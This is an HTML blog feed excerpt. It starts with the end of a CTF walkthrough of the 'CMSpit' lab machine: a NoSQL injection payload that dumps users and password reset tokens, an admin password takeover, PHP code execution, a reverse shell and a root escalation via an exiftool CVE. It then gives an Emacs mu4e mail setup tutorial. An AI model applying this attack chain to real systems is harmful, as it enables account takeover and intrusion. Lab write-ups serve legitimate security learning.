&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$func&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;var_dump&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;this will dump all the users available on the cms&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/available_users.png&quot; alt=&quot;available_users&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Second Method&lt;/strong&gt;  Which is the easiest way , is by using msf which is shown bellow .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/users.png&quot; alt=&quot;users&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cms-exploitation&quot;&gt;CMS Exploitation.&lt;/h2&gt;
&lt;h3 id=&quot;getting-reset-token&quot;&gt;Getting Reset Token&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;To obtain reset token we use the same payload we used to gather the 4 users , like below .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/dump_resettoken.png&quot; alt=&quot;dump_resettoken&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We can also use the payload to dump data about admin&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/dumping_information.png&quot; alt=&quot;dumping_information&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;changing-admin-password&quot;&gt;Changing Admin Password&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;To change the admin password we simply send a request to /auth/resetpassword with the token we obtained and the new password we want to set .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/password_reset.png&quot; alt=&quot;password_reset&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;login-to-admin-panel&quot;&gt;Login To Admin Panel&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;After changing the admin password , we can simply login .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/admin_panel.png&quot; alt=&quot;admin_panel&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;To grab the &lt;strong&gt;webflag&lt;/strong&gt; we simply head over to /finder and we read webflag.php file&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;There’s 2 ways two obtain RCE as i know .&lt;/li&gt;
  &lt;li&gt;To get RCE we simply create a new file and add malicious php code in it and execute it directly .
&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/create_file.png&quot; alt=&quot;create_file&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/avada_code.png&quot; alt=&quot;avada_code&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/code_exec.png&quot; alt=&quot;code_exec&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;After we got code execution now we can procced to get a full reverse shell&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/reverse_shell.png&quot; alt=&quot;reverse_shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/reverse_shell1.png&quot; alt=&quot;reverse_shell1&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;And there we go we got a shell .&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;user-enumeration-1&quot;&gt;User Enumeration&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;There’s one user on the box &lt;strong&gt;Stux&lt;/strong&gt; and we can access his home folder , listing hidden files we found few files that we can read .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/listing_files.png&quot; alt=&quot;listing_files&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;There’s one interesting file &lt;em&gt;.dbshell&lt;/em&gt; , we can read it .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/catting_dbshell.png&quot; alt=&quot;catting_dbshell&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Right there we got &lt;strong&gt;stux&lt;/strong&gt; password and another flag.&lt;/li&gt;
  &lt;li&gt;Now let’s su and get the &lt;strong&gt;user flag&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/su_catuser.png&quot; alt=&quot;su_catuser&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Without wasting time when i did the box i ran linpeas however it didn’t show anything interesting besides one little thing .&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;stux&lt;/strong&gt; Is allowed to run &lt;strong&gt;exiftool&lt;/strong&gt; with &lt;strong&gt;sudo&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Using &lt;a href=&quot;https://gtfobins.github.io/gtfobins/exiftool/#sudo&quot;&gt;GTFOBINs&lt;/a&gt; to abuse exiftool and to overwrite files as root didn’t work. so looked more at good and found that exiftool recently had vulnerability hat allows for arbitrary code execution when parsing a malicious image.&lt;/li&gt;
  &lt;li&gt;We can craft a malicious image with our commands so it gets executed when its parsed with exiftool , there’s this &lt;a href=&quot;https://github.com/bilkoh/POC-CVE-2021-22204&quot;&gt;POC&lt;/a&gt; which is a perl script that will generate a one image with our commands .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/crafting_payload.png&quot; alt=&quot;crafting_payload&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now we just have to start a python server and upload our image to the box and execute it .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/up_and_run.png&quot; alt=&quot;up_and_run&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now we can check if successfully managed to obtain the root flag .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/check_test.png&quot; alt=&quot;check_test&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;There we go, we got the root flag.&lt;/li&gt;
  &lt;li&gt;Now let’s attempt to obtain a root shell, to do this i’ll generate an ssh-key and placing the key into root ssh folder .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/ssh_key2.png&quot; alt=&quot;ssh_key2&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;And let’s check if it works .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/final_root.png&quot; alt=&quot;final_root&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;And That’s Pretty Much The Box , Hope You Enjoyed Reading Take Care And i’ll see you all other time :)&lt;/li&gt;
&lt;/ul&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="THM" /><category term="THM" /><category term="Medium" /><summary type="html">CMSpit Is a medium linux machine that consist of identifying vulnerabilties related to web CMS framework that includes information gathering,user enumeration,privilege escalation.</summary></entry><entry><title type="html">How To Setup Mail In Emacs</title><link href="/emacs/2021/07/23/Emacs-Mail-Setup.html" rel="alternate" type="text/html" title="How To Setup Mail In Emacs" /><published>2021-07-23T00:00:00+01:00</published><updated>2021-09-21T00:00:00+01:00</updated><id>/emacs/2021/07/23/Emacs-Mail-Setup</id><content type="html" xml:base="/emacs/2021/07/23/Emacs-Mail-Setup.html">&lt;p&gt;If you’re an emacs user and love using emacs for literally everything , then you are in the right place.
In This Short Tutorial we are gonna learn how to setup Mu4e In Emacs From Scratch.&lt;/p&gt;

&lt;h2 id=&quot;installing-mu4e&quot;&gt;Installing Mu4e&lt;/h2&gt;
&lt;p&gt;There’s a lot of ways to install mu4e in emacs , one of the easiest ways to do it if you have &lt;strong&gt;doom emacs&lt;/strong&gt; installed is to edit init.el and uncomment the mail option &lt;em&gt;mu4e&lt;/em&gt;.
the other way is to install it manually which we will cover it later on in mu installation.&lt;/p&gt;

&lt;h2 id=&quot;installing-and-mu-git-and-mu4e&quot;&gt;Installing and mu-git and mu4e&lt;/h2&gt;
&lt;p&gt;In order to index our mail we’ll be using &lt;em&gt;mu&lt;/em&gt; which includes &lt;em&gt;mu4e&lt;/em&gt; for emacs.
There’s few different ways to install &lt;em&gt;mu&lt;/em&gt; which changes from distribution to another.
The current stable release is &lt;strong&gt;1.6.6&lt;/strong&gt;, in case u installed 1.7.0 there’s a high chance you’ll be facing few problems and experiencing some bugs , so be sure which version you’re installing .
In &lt;strong&gt;Arch&lt;/strong&gt; Using &lt;em&gt;AUR&lt;/em&gt; is pretty straight forward.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yay &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; offlineimap mu-git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;strong&gt;Debian&lt;/strong&gt; the stable release is 1.4.15 which is really fine really, you can use the instable repositories to install 1.6.*&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mu4e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In Case your distribution doesn’t have &lt;em&gt;mu&lt;/em&gt; on their repositories you can install it from source which is really easy.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;release/1.6&quot;&lt;/span&gt; https://github.com/djcb/mu/
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;mu
meson &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--buildtype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;plain build
ninja &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; build &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;installing-isync-or-offlineimap&quot;&gt;Installing Isync Or OfflineImap&lt;/h2&gt;
&lt;p&gt;Both &lt;em&gt;Isync&lt;/em&gt; And &lt;em&gt;Offlineimap&lt;/em&gt; are great programs to download our mail into our inbox.
There isn’t really that much difference, it just depends on which one you’d like to install.
To Install &lt;em&gt;Isync&lt;/em&gt; Or &lt;em&gt;Offlineimap&lt;/em&gt; On &lt;strong&gt;Arch&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; isync
pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; offlineimap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To Install &lt;em&gt;Isync&lt;/em&gt; or &lt;em&gt;Offlineimap&lt;/em&gt; On &lt;strong&gt;Debian&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;isync
apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;offlineimap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;configuring-isync&quot;&gt;Configuring Isync&lt;/h2&gt;
&lt;p&gt;Configuring &lt;em&gt;Isync&lt;/em&gt; is really easy however it depends on which options you’d like to set.
By default if you gonna use &lt;em&gt;Gmail&lt;/em&gt; like myself. you’d wanna set some google options first .
If you have 2FA enabled, you should first set up an app password this will let’s you control your &lt;em&gt;Gmail only&lt;/em&gt; will a custom generated password. First head up to &lt;a href=&quot;https://myaccount.google.com/apppasswords&quot;&gt;Set Up App Password&lt;/a&gt;, Select app as &lt;strong&gt;Mail&lt;/strong&gt; and device as &lt;strong&gt;Custom&lt;/strong&gt; and give it a name, it will generate a custom password. 
&lt;strong&gt;Disclaimer&lt;/strong&gt; Your password should no be shared with anyone except yourself and &lt;em&gt;Isync&lt;/em&gt;
&lt;strong&gt;Extra&lt;/strong&gt; As your password will be kept in &lt;em&gt;Isync&lt;/em&gt; config file in plain text, you can avoid this and encrypt it using &lt;strong&gt;GPG&lt;/strong&gt;. You can either use &lt;strong&gt;Pass&lt;/strong&gt; utility if its installed on your device as a wrapper around &lt;strong&gt;GPG&lt;/strong&gt; or use straight &lt;strong&gt;GPG&lt;/strong&gt;.
To Crypt your password using &lt;strong&gt;pass&lt;/strong&gt; command.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pass insert gmail_app 
Enter password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;test_gmail: &lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;
Retype password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;test_gmail: &lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To Crypt your password using &lt;strong&gt;GPG&lt;/strong&gt; command, First generate a new key if you don’t have one yet .&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# This will prompt you for email and a name and a password (Use a valid real mail if you gonna share ur key will others)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# WARNING: DO NOT LOSE YOUR KEYS AND THE PASSWORD YOU USED TO CREATE THE KEYS OTHERWISE YOUR DATA WILL BE LOSE IF YOU LOSE THEM &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ALWAYS BACKUP YOUR .gnupg AND .password-store FOLDER TO A USB_DRIVE OR AN EXTERNAL DRIVE OR IN THE CLOUD&lt;/span&gt;
gpg &lt;span class=&quot;nt&quot;&gt;--full-generate-key&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# After u create your own key, find it through the following command&lt;/span&gt;
gpg &lt;span class=&quot;nt&quot;&gt;-K&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--keyid-format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;long
&lt;span class=&quot;c&quot;&gt;# You'll get something like this &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# sec   rsa2048/84263A08F86B7E99 2020-06-17 [SC] [expires: 2022-06-17]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       447FE384AAE41F357F5876FF84263A08F86B7E99&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# uid                 [ultimate] Ybenel &amp;lt;r2dr0dn@pm.me&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ssb   rsa2048/C8D9741AC03BE89C 2020-06-17 [E] [expires: 2022-06-17]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Now you have your long key and ur short key, you can use whatever u want , now let's encrypt your file&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YOUR APP PASSWORD&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gmail_app
gpg &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 84263A08F86B7E99 gmail_app 
&lt;span class=&quot;c&quot;&gt;# This will create a new encrypted file called gmail_app.gpg, delete the gmail_app that contains plain text passowrd preferbly using shred&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Before quickly setting up our configuration file let’s create a mail folder, to do so .&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ~/Mail/Gmail
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now we need to create our configuration file that is located in our HOME folder which will be called &lt;strong&gt;~/.mbsyncrc&lt;/strong&gt; . And Let’s put our configurations .&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IMAPAccount gmail
Host imap.gmail.com
User USERMAIL@gmail.com
PassCmd &lt;span class=&quot;s2&quot;&gt;&quot;gpg -q --for-your-eyes-only --no-tty -d ~/.password-store/gmail_app.gpg&quot;&lt;/span&gt;
SSLType IMAPS
CertificateFile /etc/ssl/certs/ca-certificates.crt

IMAPStore gmail-remote
Account gmail

MaildirStore gmail-local
Subfolders Verbatim
Path ~/Mail/Gmail/
Inbox ~/Mail/Gmail/Inbox

Channel gmail
Far :gmail-remote:
Near :gmail-local:
Patterns &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;![&lt;/span&gt;Gmail]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Gmail]/Sent Mail&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Gmail]/All Mail&quot;&lt;/span&gt;
Create Both
Expunge Both
SyncState &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you use a plain text password replace &lt;strong&gt;PassCmd&lt;/strong&gt; With &lt;strong&gt;Pass&lt;/strong&gt; And Put your password .
In &lt;strong&gt;Patterns&lt;/strong&gt; This will download &lt;em&gt;Sent Mail&lt;/em&gt; And &lt;em&gt;All Mail&lt;/em&gt; and exclude everything else, you can add other folders as well as example , &lt;strong&gt;“[Gmail]/Spam”&lt;/strong&gt; this will download the spam mail as well .
&lt;strong&gt;Other Than GMAIL&lt;/strong&gt; if you use another email service you can replace the above config with the correct info , and replace gmail with a custom name, as a quick example .&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IMAPAccount cock 
Host mail.cock.li
User suckmycock11@cock.li
PassCmd &lt;span class=&quot;s2&quot;&gt;&quot;gpg -q --for-your-eyes-only --no-tty -d ~/.password-store/cockli.gpg&quot;&lt;/span&gt;
SSLType IMAPS
CertificateFile /etc/ssl/certs/ca-certificates.crt

IMAPStore cock-remote
Account cock

MaildirStore cock-local
Subfolders Verbatim
Path ~/Mail/cock/
Inbox ~/Mail/cock/Inbox

Channel gmail
Far :gmail-remote:
Near :gmail-local:
Patterns &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;![&lt;/span&gt;Inbox]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Inbox]/Sent Mail&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Inbox]/All Mail&quot;&lt;/span&gt;
Create Both
Expunge Both
SyncState &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;configuring-offlineimap&quot;&gt;Configuring OfflineImap&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Offlineimap&lt;/em&gt; Configurations is no different than &lt;em&gt;Isync&lt;/em&gt; however it does support OAUTH2 authentication mechanism which u can use or not use if u want to and what it does is just the same as App Password But With Token. Keep in mind OAUTH2 does really need more little effort if you wanna use it. Starting Off With&lt;/p&gt;
&lt;h3 id=&quot;setting-up-googleapi&quot;&gt;Setting Up GoogleApi&lt;/h3&gt;
&lt;p&gt;GoogleAPI Is required to enable GmailApi , This will allow us to read and edit mail from our gmail account, to enable simply head over google api and search for gmailapi and click enable once its enabled search for generate token and copy it to an empty file for later.&lt;/p&gt;
&lt;h3 id=&quot;installing-gmail-oauth-tools&quot;&gt;Installing gmail-oauth-tools&lt;/h3&gt;
&lt;p&gt;In order for us to use the token we got earlier we need to install and use gmail-oauth-tools this will generate a refresh token that we will use later in configuring offlineimap.
To Install simply run .&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/google/gmail-oauth2-tools Public/oauth2-tools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And run the following command to get your refresh token&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 Public/oauth2-tools/python/oauth2.py &lt;span class=&quot;nt&quot;&gt;--generate_oauth2_token&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--client_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;YOUR_CLIENT_ID &lt;span class=&quot;nt&quot;&gt;--client_secret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;YOUR_CLIENT_SECRET
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To Get Your CLIENT-ID Head over to &lt;a href=&quot;https://github.com/OfflineIMAP/offlineimap/blob/master/offlineimap.conf#L886-L894&quot;&gt;Here&lt;/a&gt; and read the steps .&lt;/p&gt;

&lt;h3 id=&quot;adding-the-configuration-files&quot;&gt;Adding The Configuration Files&lt;/h3&gt;
&lt;p&gt;To Configure OfflineIMAP Put The Following Configurations In &lt;strong&gt;~/.offlineimaprc&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;[general]&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;accounts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Gmail&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;maxsyncaccounts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;3&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#pythonfile = ~/.offlineimap.py
&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;[Account Gmail]&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;localrepository&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Local&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;remoterepository&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Remote&lt;/span&gt;

&lt;span class=&quot;nn&quot;&gt;[Repository Local]&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Maildir&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;localfolders&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;~/Maildir&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: '[Gmail]/' + f if f in ['Drafts', 'Starred', 'Important', 'Spam', 'Trash', 'All Mail', 'Sent Mail'] else f&lt;/span&gt;

&lt;span class=&quot;nn&quot;&gt;[Repository Remote]&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;IMAP&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;remotehost&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;imap.gmail.com&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;remoteuser&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;USERMAIL@gmail.com&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;auth_mechanisms&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;XOAUTH2&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;oauth2_client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;CLIENT_ID&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;oauth2_client_secret&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;CLIENT_SECRET&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;oauth2_request_url&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://accounts.google.com/o/oauth2/token&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;oauth2_refresh_token&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;REFRESH_TOKEN&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;ssl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yes&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;maxconnections&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;sslcacertfile&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/etc/ssl/certs/ca-certificates.crt&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;ssl_version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;tls1_2&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;folderfilter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda foldername: foldername in ['INBOX', 'All Mail', 'Sent Mail']&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: f.replace('[Gmail]/', '') if f.startswith('[Gmail]/') else f&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Replace &lt;strong&gt;CLIENT-ID,CLIENT-SECRET,REFRESH-TOKEN&lt;/strong&gt; with the tokens you’ve got.
